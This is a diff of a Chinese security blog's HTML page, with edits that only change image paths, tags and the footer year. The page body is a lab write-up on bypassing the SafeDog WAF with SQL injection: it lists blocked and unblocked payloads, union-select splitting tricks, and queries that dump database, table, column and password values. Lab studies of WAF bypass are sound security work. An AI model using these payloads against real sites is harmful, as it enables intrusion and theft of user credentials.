@@ -10,8 +10,8 @@
     <meta property="og:type" content="article">
 
     
-    <meta property="og:image" content="https://littlebin404.github.io/img/main.jpg">
-    <meta property="twitter:image" content="https://littlebin404.github.io/img/main.jpg" />
+    <meta property="og:image" content="https://littlebin404.github.io/img/about/2.jpg">
+    <meta property="twitter:image" content="https://littlebin404.github.io/img/about/2.jpg" />
     
 
     
@@ -137,6 +137,10 @@
                             <a href="/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8">神兵利器</a>
                         </li>
                         
+                        <li>
+                            <a href="/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97">红蓝对抗</a>
+                        </li>
+                        
                     
                     
 		    
@@ -189,7 +193,7 @@
 
 <style type="text/css">
     header.intro-header {
-        background-image: url('/img/main.jpg')
+        background-image: url('/img/about/2.jpg')
     }
 </style>
 <header class="intro-header">
@@ -209,7 +213,7 @@
                     <span class="meta">
                         Posted by 
                         
-                            littlebin404
+                            Littlebin404
                          
                         on 
                         Monday, March 23, 2020
@@ -258,37 +262,37 @@
 <h2 id="环境部署">环境部署</h2>
 <p><code>phpstudy+安全狗4.0.2655 搭建的环境</code></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-toml" data-lang="toml">url：http:<span style="color:#bd93f9">192.168</span>.<span style="color:#bd93f9">114.133</span>/sql.php?id=<span style="color:#bd93f9">1</span>
-</code></pre></div><p><img src="/img/B1.png" alt="screenshot"></p>
+</code></pre></div><p><img src="/img/B/B1.png" alt="screenshot"></p>
 <h2 id="payload测试">payload测试</h2>
 <p><code>or 1=1   拦</code>
-<img src="/img/B2.png" alt="screenshot"></p>
+<img src="/img/B/B2.png" alt="screenshot"></p>
 <p><code>&amp;&amp; true 不拦（&amp;&amp; 1 拦）</code>
-<img src="/img/B3.png" alt="screenshot"></p>
+<img src="/img/B/B3.png" alt="screenshot"></p>
 <p><code>xor 1  不拦</code>
-<img src="/img/B4.png" alt="screenshot"></p>
+<img src="/img/B/B4.png" alt="screenshot"></p>
 <p><code>xor 0  不拦</code>
-<img src="/img/B5.png" alt="screenshot"></p>
+<img src="/img/B/B5.png" alt="screenshot"></p>
 <p><code>?id=1/*&amp;id=1 order by 2%23*/ 不拦</code>
-<img src="/img/B6.png" alt="screenshot"></p>
+<img src="/img/B/B6.png" alt="screenshot"></p>
 <p><code>?id=1/*&amp;id=0 union select 1,2%23*/  不拦</code></p>
 <p><code>sql.php?/*&amp;id=0 union select 1,2%23*/  也行</code>
-<img src="/img/B7.png" alt="screenshot"></p>
+<img src="/img/B/B7.png" alt="screenshot"></p>
 <p>替换回显位2：</p>
 <p><code>(select group_concat(schema_name) from information_schema.schemata) </code></p>
 <p><em>爆出数据库名：</em></p>
-<p><img src="/img/B8.png" alt="screenshot"></p>
+<p><img src="/img/B/B8.png" alt="screenshot"></p>
 <p>替换回显位2：</p>
 <p><code>(select group_concat(table_name) from information_schema.tables where table_schema='security')</code></p>
 <p>爆出表名:</p>
-<p><img src="/img/B9.png" alt="screenshot"></p>
+<p><img src="/img/B/B9.png" alt="screenshot"></p>
 <p>替换回显位2：</p>
 <p><code>(select group_concat(column_name) from information_schema.columns where table_name='users')  </code></p>
 <p>爆出列名:</p>
-<p><img src="/img/B10.png" alt="screenshot"></p>
+<p><img src="/img/B/B10.png" alt="screenshot"></p>
 <p>替换回显位2：
 <code>(select group_concat(password) from security.users) </code></p>
 <p>爆出password字段值:</p>
-<p><img src="/img/B11.png" alt="screenshot"></p>
+<p><img src="/img/B/B11.png" alt="screenshot"></p>
 <h2 id="aspiis-特性">asp+iis 特性</h2>
 <blockquote>
 <p>在IIS+ASP的环境中，对于URL请求的参数值中的%，如果和后面的字符构成的字符串在URL编码表之外，ASP脚本处理时会将其忽略。
@@ -378,6 +382,12 @@
                         </a>
                         
                         
+                        
+                        <a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97" title="红蓝对抗">
+                            红蓝对抗
+                        </a>
+                        
+                        
                     </div>
                 </section>
                 
@@ -451,7 +461,7 @@
             
                 </ul>
 		<p class="copyright text-muted">
-                    Copyright &copy; Littlebin404 Blog 2020
+                    Copyright &copy; Littlebin404 Blog 2021
                     
                     
                     
